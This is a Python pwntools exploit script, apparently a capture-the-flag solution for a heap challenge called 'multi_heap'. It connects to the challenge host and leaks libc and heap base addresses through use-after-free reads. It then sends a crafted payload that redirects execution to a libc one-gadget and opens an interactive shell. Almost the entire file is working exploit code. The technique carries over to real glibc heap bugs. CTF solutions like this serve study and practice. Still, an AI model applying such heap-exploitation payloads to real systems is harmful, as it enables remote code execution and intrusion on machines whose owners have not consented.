#!/usr/bin/env python
from pwn import *

context(terminal=['tmux', 'splitw', '-h'])  # horizontal split window
# context(terminal=['tmux', 'new-window'])  # open new window

# libc = ELF('')
elf = ELF('./multi_heap')
context(os='linux', arch=elf.arch)
# context(log_level='debug')  # output verbose log

RHOST = "multiheap.chal.ctf.westerns.tokyo"
RPORT = 10001
LHOST = "127.0.0.1"
LPORT = 10001

def section_addr(name, elf=elf):
    return elf.get_section_by_name(name).header['sh_addr']

def dbg(ss):
    log.info("%s: 0x%x" % (ss, eval(ss)))

conn = None
opt = sys.argv.pop(1) if len(sys.argv) > 1 else '?'  # pop option
if opt in 'rl':
    conn = remote(*{'r': (RHOST, RPORT), 'l': (LHOST, LPORT)}[opt])
elif opt == 'd':
    gdbscript = """
    
    continue
    """.format(hex(elf.symbols['main'] if 'main' in elf.symbols.keys() else elf.entrypoint))
    conn = gdb.debug(['./multi_heap'], gdbscript=gdbscript)
else:
    conn = process(['./multi_heap'])
    # conn = process(['./multi_heap'], env={'LD_PRELOAD': ''})
    if opt == 'a': gdb.attach(conn)

def alloc(size, Thread=False):
    conn.sendlineafter('choice: ', '1')
    conn.sendlineafter('Which', 'char')
    conn.sendlineafter('Size', str(size))
    if Thread:
        conn.sendlineafter('Thread', 't')
    else:
        conn.sendlineafter('Thread', 'm')

def free(idx):
    conn.sendlineafter('choice: ', '2')
    conn.sendlineafter('Index', str(idx))

def write(idx):
    conn.sendlineafter('choice: ', '3')
    conn.sendlineafter('Index', str(idx))

def read(idx, size, p):
    conn.sendlineafter('choice: ', '4')
    conn.sendlineafter('Index', str(idx))
    conn.sendlineafter('Size', str(size))
    conn.sendafter('Content', p)

def copy(idx1, idx2, size):
    conn.sendlineafter('choice: ', '5')
    conn.sendlineafter('index', str(idx1))
    conn.sendlineafter('index', str(idx2))
    conn.sendlineafter('Size', str(size))
    conn.sendlineafter('Thread process', 'y')

# exploit
log.info('Pwning')


sizes = [0x200000, 0x400000, 0x1000000, 0x4000000, 0x10000000, 0x40000000]
for a in sizes:
    alloc(a)
    free(0)
    alloc(a)
    free(0)


alloc(0x418)
alloc(0xf8)
free(0)
alloc(0x418)

write(1)
conn.recvuntil(': ')
libc_base = u64(conn.recv(6) + '\x00\x00') - 0x3ebca0
dbg('libc_base')


alloc(0xf8)
free(2)
free(0)
alloc(0xf8)
alloc(0xf8)

write(1)
conn.recvuntil(': ')
heap_base = u64(conn.recv(6) + '\x00\x00') - 0x12460
dbg('heap_base')


alloc(0x18)
alloc(0x18)

read(4, 0x10, 'x'*0x10)
alloc(0x100 * 0x1000 * 0x1000)
payload = p64(0xdeadbeef) * 0xea + p64(heap_base + 0x12600) + 'x'*8
payload += p64(heap_base + 0x12600) + p64(libc_base + 0x4f322)
read(5, len(payload), payload)

copy(5, 4, 0)
free(0)
# conn.sendline('2\n0')
conn.interactive()




